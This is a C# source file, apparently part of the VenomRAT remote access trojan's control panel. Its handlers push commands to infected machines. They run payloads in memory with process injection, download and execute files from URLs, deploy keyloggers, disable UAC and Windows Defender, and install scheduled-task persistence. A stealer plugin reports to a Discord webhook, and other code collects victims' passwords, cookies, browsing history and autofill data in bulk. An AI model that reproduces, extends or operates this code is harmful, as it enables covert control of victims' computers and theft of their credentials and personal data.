			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			foreach (Clients selectedClient in SelectedClients)
			{
				if (!selectedClient.IsAdmin)
				{
					ThreadPool.QueueUserWorkItem(selectedClient.Send, msgPack2.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void StopStubMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "close";
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			foreach (Clients selectedClient in SelectedClients)
			{
				ThreadPool.QueueUserWorkItem(selectedClient.Send, msgPack2.Encode2Bytes());
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void UninstallStubMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "uninstall";
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			foreach (Clients selectedClient in SelectedClients)
			{
				ThreadPool.QueueUserWorkItem(selectedClient.Send, msgPack2.Encode2Bytes());
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void UpdateStubMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		try
		{
			using OpenFileDialog openFileDialog = new OpenFileDialog();
			if (openFileDialog.ShowDialog() != DialogResult.OK)
			{
				return;
			}
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "sendFile";
			msgPack.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(openFileDialog.FileName)));
			msgPack.ForcePathObject("FileName").AsString = Path.GetFileName(openFileDialog.FileName);
			msgPack.ForcePathObject("Update").AsString = "true";
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendFile.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			foreach (Clients selectedClient in SelectedClients)
			{
				ThreadPool.QueueUserWorkItem(selectedClient.Send, msgPack2.Encode2Bytes());
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void VisitWebSiteMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		try
		{
			string text = Interaction.InputBox("Visit website", "URL", "https://www.baidu.com");
			if (string.IsNullOrEmpty(text))
			{
				return;
			}
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "visitURL";
			msgPack.ForcePathObject("URL").AsString = text;
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Extra.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			foreach (Clients selectedClient in SelectedClients)
			{
				ThreadPool.QueueUserWorkItem(selectedClient.Send, msgPack2.Encode2Bytes());
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void SendFileFromUrlMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		string text = Interaction.InputBox("\nInput Url here.\n\nOnly for exe.", "Url");
		if (string.IsNullOrEmpty(text))
		{
			return;
		}
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "downloadFromUrl";
			msgPack.ForcePathObject("url").AsString = text;
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Extra.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			foreach (Clients selectedClient in SelectedClients)
			{
				ThreadPool.QueueUserWorkItem(selectedClient.Send, msgPack2.Encode2Bytes());
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private async void SendFileToDiskMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		try
		{
			using OpenFileDialog openFileDialog = new OpenFileDialog();
			openFileDialog.Multiselect = true;
			if (openFileDialog.ShowDialog() != DialogResult.OK)
			{
				return;
			}
			MsgPack packet = new MsgPack();
			packet.ForcePathObject("Pac_ket").AsString = "sendFile";
			packet.ForcePathObject("Update").AsString = "false";
			MsgPack msgpack = new MsgPack();
			msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendFile.dll");
			foreach (Clients client in SelectedClients)
			{
				string[] fileNames = openFileDialog.FileNames;
				foreach (string file in fileNames)
				{
					await Task.Run(delegate
					{
						packet.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(file)));
						packet.ForcePathObject("FileName").AsString = Path.GetFileName(file);
						msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());
					});
					ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void SendFileToMemoryMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		try
		{
			FormSendFileToMemory formSendFileToMemory = new FormSendFileToMemory();
			if (formSendFileToMemory.ShowDialog() == DialogResult.OK)
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "sendMemory";
				msgPack.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(formSendFileToMemory.toolStripStatusLabel1.Tag.ToString())));
				if (formSendFileToMemory.comboBox1.SelectedIndex == 0)
				{
					msgPack.ForcePathObject("Inject").AsString = "";
				}
				else
				{
					msgPack.ForcePathObject("Inject").AsString = formSendFileToMemory.comboBox2.Text;
				}
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendMemory.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				foreach (Clients selectedClient in SelectedClients)
				{
					ThreadPool.QueueUserWorkItem(selectedClient.Send, msgPack2.Encode2Bytes());
				}
			}
			formSendFileToMemory.Close();
			formSendFileToMemory.Dispose();
		}
		catch (Exception)
		{
		}
	}

	private void TaskOfflineKeylogMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "sendMemory";
			msgPack.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes("Plugins\\Keylogger.exe")));
			msgPack.ForcePathObject("Inject").AsString = "";
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendMemory.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			foreach (Clients selectedClient in SelectedClients)
			{
				ThreadPool.QueueUserWorkItem(selectedClient.Send, msgPack2.Encode2Bytes());
				new HandleLogs().Addmsg("Offline Keylogger is started in " + selectedClient.Ip, Color.Red);
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	public void UpdatePasswordGrid()
	{
		gridControlRecoveryPassword.BeginUpdate();
		gridControlRecoveryPassword.EndUpdate();
	}

	private void RefreshRecovery()
	{
		initRecovery();
		MsgPack msgPack = new MsgPack();
		msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
		string checksum = GetHash.GetChecksum("Plugins\\Recovery.dll");
		msgPack.ForcePathObject("Dll").AsString = checksum;
		foreach (Clients connectedClient in Settings.connectedClients)
		{
			ThreadPool.QueueUserWorkItem(connectedClient.Send, msgPack.Encode2Bytes());
		}
	}

	private void initRecovery()
	{
		listViewRecoveryClients.Items.Clear();
	}

	public void ViewClient(string ip)
	{
		if (!string.IsNullOrEmpty(ip))
		{
			ShowClientPasswords(ip);
			ShowClientCookies(ip);
			ShowClientHistory(ip);
			ShowClientBookmark(ip);
			ShowClientAutofills(ip);
		}
	}

	private void ShowClientCookies(string ip)
	{
		string path = Path.Combine(Application.StartupPath, "ClientsFolder", ip, "Recovery") + "\\cookies.json";
		if (!File.Exists(path))
		{
			return;
		}
		string value = File.ReadAllText(path);
		try
		{
			List<Cookie> dataSource = JsonConvert.DeserializeObject<List<Cookie>>(value);
			gridControlCookie.DataSource = dataSource;
		}
		catch
		{
		}
	}

	private void ShowClientHistory(string ip)
	{
		string path = Path.Combine(Application.StartupPath, "ClientsFolder", ip, "Recovery") + "\\history.json";
		if (!File.Exists(path))
		{
			return;
		}
		string value = File.ReadAllText(path);
		try
		{
			List<Site> dataSource = JsonConvert.DeserializeObject<List<Site>>(value);
			gridControlHistory.DataSource = dataSource;
		}
		catch
		{
		}
	}

	private void ShowClientBookmark(string ip)
	{
		string path = Path.Combine(Application.StartupPath, "ClientsFolder", ip, "Recovery") + "\\bookmark.json";
		if (!File.Exists(path))
		{
			return;
		}
		string value = File.ReadAllText(path);
		try
		{
			List<Bookmark> dataSource = JsonConvert.DeserializeObject<List<Bookmark>>(value);
			gridControlBookmarks.DataSource = dataSource;
		}
		catch
		{
		}
	}

	private void ShowClientAutofills(string ip)
	{
		string path = Path.Combine(Application.StartupPath, "ClientsFolder", ip, "Recovery") + "\\autofill.json";
		if (!File.Exists(path))
		{
			return;
		}
		string value = File.ReadAllText(path);
		try
		{
			List<AutoFill> dataSource = JsonConvert.DeserializeObject<List<AutoFill>>(value);
			gridControlAutofill.DataSource = dataSource;
		}
		catch
		{
		}
	}

	private bool filter(Password ps)
	{
		string text = txtPasswordSearch.Text;
		if (string.IsNullOrEmpty(text))
		{
			return true;
		}
		if (ps.sUrl.ToLower().Contains(text.ToLower()))
		{
			return true;
		}
		if (ps.sUsername.ToLower().Contains(text.ToLower()))
		{
			return true;
		}
		if (ps.sPassword.ToLower().Contains(text.ToLower()))
		{
			return true;
		}
		return false;
	}

	private void ShowClientPasswords(string ip)
	{
		string path = Path.Combine(Application.StartupPath, "ClientsFolder", ip, "Recovery") + "\\passwords.json";
		if (!File.Exists(path))
		{
			return;
		}
		try
		{
			List<Password> list = JsonConvert.DeserializeObject<List<Password>>(File.ReadAllText(path));
			foreach (Password item in list)
			{
				item.Target = ip;
			}
			list = list.Where((Password x) => filter(x)).ToList();
			gridControlRecoveryPassword.DataSource = list;
			toolStripLabelPasswordCount.Text = $"Password count is {list.Count}";
		}
		catch
		{
		}
	}

	public void AddRecoveryClient(string ip)
	{
		foreach (string item in listViewRecoveryClients.Items)
		{
			if (item == ip)
			{
				return;
			}
		}
		listViewRecoveryClients.Items.Add(ip);
	}

	private void txtRecoverysearch_TextChanged(object sender, EventArgs e)
	{
		if (chkAll.Checked)
		{
			List<Password> list = new List<Password>();
			foreach (string item in listViewRecoveryClients.Items)
			{
				string path = Path.Combine(Application.StartupPath, "ClientsFolder", item, "Recovery") + "\\passwords.json";
				if (!File.Exists(path))
				{
					return;
				}
				try
				{
					List<Password> list2 = JsonConvert.DeserializeObject<List<Password>>(File.ReadAllText(path));
					foreach (Password item2 in list2)
					{
						item2.Target = item;
					}
					list.AddRange(list2.Where((Password x) => filter(x)).ToList());
				}
				catch
				{
				}
			}
			gridControlRecoveryPassword.DataSource = list;
			toolStripLabelPasswordCount.Text = $"Password count is {list.Count}";
		}
		else
		{
			string ip = (string)listViewRecoveryClients.SelectedItem;
			ShowClientPasswords(ip);
		}
	}

	private void LoadRecovery()
	{
		string path = Path.Combine(Application.StartupPath, "ClientsFolder");
		try
		{
			string[] directories = Directory.GetDirectories(path);
			foreach (string path2 in directories)
			{
				Path.GetFileName(path2);
				if ((from x in Directory.GetFileSystemEntries(path2)
					where Path.GetFileName(x) == "Recovery"
					select x).Count() > 0)
				{
					AddRecoveryClient(Path.GetFileName(path2));
				}
			}
		}
		catch
		{
		}
	}

	private void listViewClients_MouseDoubleClick(object sender, MouseEventArgs e)
	{
		if (!string.IsNullOrEmpty(SelectedRecoveryIP))
		{
			string arguments = Path.Combine(Application.StartupPath, "ClientsFolder", SelectedRecoveryIP, "Recovery");
			Process.Start("explorer", arguments);
		}
	}

	private void listViewClients_MouseClick(object sender, MouseEventArgs e)
	{
		ViewClient(SelectedRecoveryIP);
	}

	private void listViewRecoveryClients_MouseUp(object sender, MouseEventArgs e)
	{
		try
		{
			if (e.Button == MouseButtons.Right)
			{
				popupMenuRecovery.ShowPopup(listViewRecoveryClients.PointToScreen(e.Location));
			}
		}
		catch
		{
		}
	}

	private void refreshRecoveryToolStripMenuItem_Click(object sender, EventArgs e)
	{
		RefreshRecovery();
	}

	private void SaveAllCookieTxt()
	{
		string path = Path.Combine(Application.StartupPath, "ClientsFolder", "all_cookies.txt");
		if (File.Exists(path))
		{
			File.Delete(path);
		}
		string[] directories = Directory.GetDirectories(Path.Combine(Application.StartupPath, "ClientsFolder"));
		for (int i = 0; i < directories.Length; i++)
		{
			string path2 = Path.Combine(directories[i], "Recovery", "cookies.txt");
			if (File.Exists(path2))
			{
				File.AppendAllText(path, File.ReadAllText(path2));
			}
		}
	}

	private bool SaveWebDataToInAFile(string infofilename)
	{
		string path = Path.Combine(Application.StartupPath, "ClientsFolder", "all_" + infofilename);
		if (File.Exists(path))
		{
			File.Delete(path);
		}
		bool result = false;
		string[] directories = Directory.GetDirectories(Path.Combine(Application.StartupPath, "ClientsFolder"));
		for (int i = 0; i < directories.Length; i++)
		{
			string path2 = Path.Combine(directories[i], "Recovery", infofilename);
			if (File.Exists(path2))
			{
				string text = File.ReadAllText(path2).Trim();
				text = text.Substring(1, text.Length - 2).Trim();
				if (!string.IsNullOrEmpty(text))
				{
					File.AppendAllText(path, text);
					File.AppendAllText(path, ",\r\n");
					result = true;
				}
			}
		}
		return result;
	}

	private void CopyIpMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		Clipboard.SetText(SelectedRecoveryIP);
	}

	private void SaveAllPassword_ItemClick(object sender, ItemClickEventArgs e)
	{
		if (SaveWebDataToInAFile("passwords.json"))
		{
			new HandleLogs().Addmsg("All Passwords are saved to ClientsFolder/all_passwords.json", Color.Black);
		}
	}

	private void SaveAllCookies_ItemClick(object sender, ItemClickEventArgs e)
	{
		SaveAllCookieTxt();
		if (SaveWebDataToInAFile("cookies.json"))
		{
			new HandleLogs().Addmsg("All Cookies are saved to ClientsFolder/all_cookies.json, all_cookies.txt", Color.Black);
		}
	}

	private void SaveAllHistory_ItemClick(object sender, ItemClickEventArgs e)
	{
		if (SaveWebDataToInAFile("history.json"))
		{
			new HandleLogs().Addmsg("All Historys are saved to ClientsFolder/all_historys.json ", Color.Black);
		}
	}

	private void SaveAllAutoFill_ItemClick(object sender, ItemClickEventArgs e)
	{
		if (SaveWebDataToInAFile("autofill.json"))
		{
			new HandleLogs().Addmsg("All autofills are saved to ClientsFolder/all_autofills.json ", Color.Black);
		}
	}

	private void SaveAllBookmarks_ItemClick(object sender, ItemClickEventArgs e)
	{
		if (SaveWebDataToInAFile("bookmark.json"))
		{
			new HandleLogs().Addmsg("All bookmarks are saved to ClientsFolder/all_bookmarks.json ", Color.Black);
		}
	}

	private void RefreshRecovery_ItemClick(object sender, ItemClickEventArgs e)
	{
		RefreshRecovery();
	}

	private void UpdateTasksGrid()
	{
		Program.mainform.Invoke((MethodInvoker)delegate
		{
			gridControlTask.BeginUpdate();
			gridControlTask.EndUpdate();
		});
	}

	private void TimerTask_Tick(object sender, EventArgs e)
	{
		new Thread((ThreadStart)delegate
		{
			try
			{
				foreach (AsyncTask listTask in listTasks)
				{
					foreach (Clients connectedClient in Settings.connectedClients)
					{
						if (!listTask.doneClient.Contains(connectedClient.ID))
						{
							listTask.doneClient.Add(connectedClient.ID);
							ThreadPool.QueueUserWorkItem(connectedClient.Send, listTask.msgPack.Encode2Bytes());
						}
					}
				}
			}
			catch
			{
			}
		}).Start();
		UpdateTasksGrid();
	}

	private void Task_SendFileFromUrl_ItemClick(object sender, ItemClickEventArgs e)
	{
		try
		{
			string text = Interaction.InputBox("\nInput Url here.\n\nOnly for exe.", "Url");
			if (!string.IsNullOrEmpty(text))
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "downloadFromUrl";
				msgPack.ForcePathObject("url").AsString = text;
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Extra.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				string title = "SendFileFromUrl: " + Path.GetFileName(text);
				if (listTasks.FirstOrDefault((AsyncTask x) => x.title == title) == null)
				{
					listTasks.Add(new AsyncTask(msgPack2, title));
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void TaskSendFileTODiskMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		try
		{
			OpenFileDialog openFileDialog = new OpenFileDialog();
			if (openFileDialog.ShowDialog() == DialogResult.OK)
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "sendFile";
				msgPack.ForcePathObject("Update").AsString = "false";
				msgPack.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(openFileDialog.FileName)));
				msgPack.ForcePathObject("FileName").AsString = Path.GetFileName(openFileDialog.FileName);
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendFile.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				string title = "SendFile: " + Path.GetFileName(openFileDialog.FileName);
				if (listTasks.FirstOrDefault((AsyncTask x) => x.title == title) == null)
				{
					listTasks.Add(new AsyncTask(msgPack2, title));
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void TaskSendFileToMemoryMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		try
		{
			FormSendFileToMemory formSendFileToMemory = new FormSendFileToMemory();
			formSendFileToMemory.ShowDialog();
			if (formSendFileToMemory.toolStripStatusLabel1.Text.Length > 0 && formSendFileToMemory.toolStripStatusLabel1.ForeColor == Color.Green)
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "sendMemory";
				msgPack.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(formSendFileToMemory.toolStripStatusLabel1.Tag.ToString())));
				if (formSendFileToMemory.comboBox1.SelectedIndex == 0)
				{
					msgPack.ForcePathObject("Inject").AsString = "";
				}
				else
				{
					msgPack.ForcePathObject("Inject").AsString = formSendFileToMemory.comboBox2.Text;
				}
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendMemory.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				string title = "SendMemory: " + Path.GetFileName(formSendFileToMemory.toolStripStatusLabel1.Tag.ToString());
				if (listTasks.FirstOrDefault((AsyncTask x) => x.title == title) != null)
				{
					return;
				}
				listTasks.Add(new AsyncTask(msgPack2, title));
			}
			formSendFileToMemory.Close();
			formSendFileToMemory.Dispose();
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void TaskDisableUACMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "disableUAC";
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Extra.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			string title = "DisableUAC:";
			if (listTasks.FirstOrDefault((AsyncTask x) => x.title == title) == null)
			{
				listTasks.Add(new AsyncTask(msgPack2, title));
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void TaskDisableWDMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "disableDefedner";
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Extra.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			string title = "DisableDefedner:";
			if (listTasks.FirstOrDefault((AsyncTask x) => x.title == title) == null)
			{
				listTasks.Add(new AsyncTask(msgPack2, title));
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void TaskInstallSchTaskMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "autoschtaskinstall";
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			string title = "InstallSchtask:";
			if (listTasks.FirstOrDefault((AsyncTask x) => x.title == title) == null)
			{
				listTasks.Add(new AsyncTask(msgPack2, title));
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void TaskUpdateAllMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		try
		{
			OpenFileDialog openFileDialog = new OpenFileDialog();
			if (openFileDialog.ShowDialog() == DialogResult.OK)
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "sendFile";
				msgPack.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(openFileDialog.FileName)));
				msgPack.ForcePathObject("FileName").AsString = Path.GetFileName(openFileDialog.FileName);
				msgPack.ForcePathObject("Update").AsString = "true";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendFile.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				string title = "Update: " + Path.GetFileName(openFileDialog.FileName);
				if (listTasks.FirstOrDefault((AsyncTask x) => x.title == title) == null)
				{
					listTasks.Add(new AsyncTask(msgPack2, title));
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void TaskTimerKeylogMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Logger.dll");
			string title = "Timer Keylogger:";
			if (listTasks.FirstOrDefault((AsyncTask x) => x.title == title) == null)
			{
				listTasks.Add(new AsyncTask(msgPack, title));
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void TaskAutoKeyloggerMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "sendMemory";
			msgPack.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes("Plugins\\Keylogger.exe")));
			msgPack.ForcePathObject("Inject").AsString = "";
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendMemory.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			string title = "Auto Keylogger:";
			if (listTasks.FirstOrDefault((AsyncTask x) => x.title == title) == null)
			{
				listTasks.Add(new AsyncTask(msgPack2, title));
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void TaskFakeBinderMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		try
		{
			OpenFileDialog openFileDialog = new OpenFileDialog();
			if (openFileDialog.ShowDialog() == DialogResult.OK)
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "fakeBinder";
				msgPack.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(openFileDialog.FileName)));
				msgPack.ForcePathObject("Extension").AsString = Path.GetExtension(openFileDialog.FileName);
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendFile.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				string title = "FakeBinder: " + Path.GetFileName(openFileDialog.FileName);
				if (listTasks.FirstOrDefault((AsyncTask x) => x.title == title) == null)
				{
					listTasks.Add(new AsyncTask(msgPack2, title));
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void TaskDeleteMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		int[] selectedRows = gridViewTask.GetSelectedRows();
		foreach (int rowHandle in selectedRows)
		{
			string title = (string)gridViewTask.GetRowCellValue(rowHandle, TaskNameColumn);
			AsyncTask asyncTask = listTasks.FirstOrDefault((AsyncTask x) => x.title == title);
			if (asyncTask != null)
			{
				listTasks.Remove(asyncTask);
			}
		}
		UpdateTasksGrid();
	}

	private void TaskLoadStealDataMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "report";
			msgPack.ForcePathObject("discordurl").AsString = Server.Properties.Settings.Default.DiscordUrl;
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Stealer.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			string title = "Fetching Data: ";
			if (listTasks.FirstOrDefault((AsyncTask x) => x.title == title) == null)
			{
				listTasks.Add(new AsyncTask(msgPack2, title));
			}
		}
		catch (Exception)
		{
		}
	}

	private void TaskLoadRecoveryDataMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Recovery.dll");
			string title = "Password Recovery: ";
			if (listTasks.FirstOrDefault((AsyncTask x) => x.title == title) == null)
			{
				listTasks.Add(new AsyncTask(msgPack, title));
				UpdateTasksGrid();
			}
		}
		catch (Exception)
		{
		}
	}

	private void listTask_MouseUp(object sender, MouseEventArgs e)
	{
		if (e.Button == MouseButtons.Right)
		{
			popupMenuTask.ShowPopup(gridControlTask.PointToScreen(e.Location));
		}
	}

	public FormMain()
	{
		InitializeComponent();
	}

	private void CheckFiles()
	{
		try
		{
			if (!File.Exists(Path.Combine(Application.StartupPath, Path.GetFileName(Process.GetCurrentProcess().MainModule.FileName) + ".config")))
			{
				MessageBox.Show("Missing " + Path.GetFileName(Process.GetCurrentProcess().MainModule.FileName) + ".config");
				Environment.Exit(0);
			}
			if (!Directory.Exists(Path.Combine(Application.StartupPath, "Stub")))
			{
				Directory.CreateDirectory(Path.Combine(Application.StartupPath, "Stub"));
			}
			if (!File.Exists(Path.Combine(Application.StartupPath, "Plugins\\ip2region.db")))
			{
				File.WriteAllBytes(Path.Combine(Application.StartupPath, "Plugins\\ip2region.db"), Resources.ip2region);
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message, "VenomRAT", MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}
	}

	private async void Connect()
	{
		try
		{
			await Task.Delay(1000);
			string[] array = Server.Properties.Settings.Default.Ports.Split(',');
			foreach (string text in array)
			{
				if (!string.IsNullOrWhiteSpace(text))
				{
					Thread thread = new Thread(new Listener().Connect);
					thread.IsBackground = true;
					thread.Start(Convert.ToInt32(text.ToString().Trim()));
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
			Environment.Exit(0);
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		gridControlLog.DataSource = HandleLogs.LogMsgs;
		gridControlTask.DataSource = listTasks;
		gridControlClient.DataSource = filteredClientsInfo;
		ListviewDoubleBuffer.Enable(listViewScreen);
		try
		{
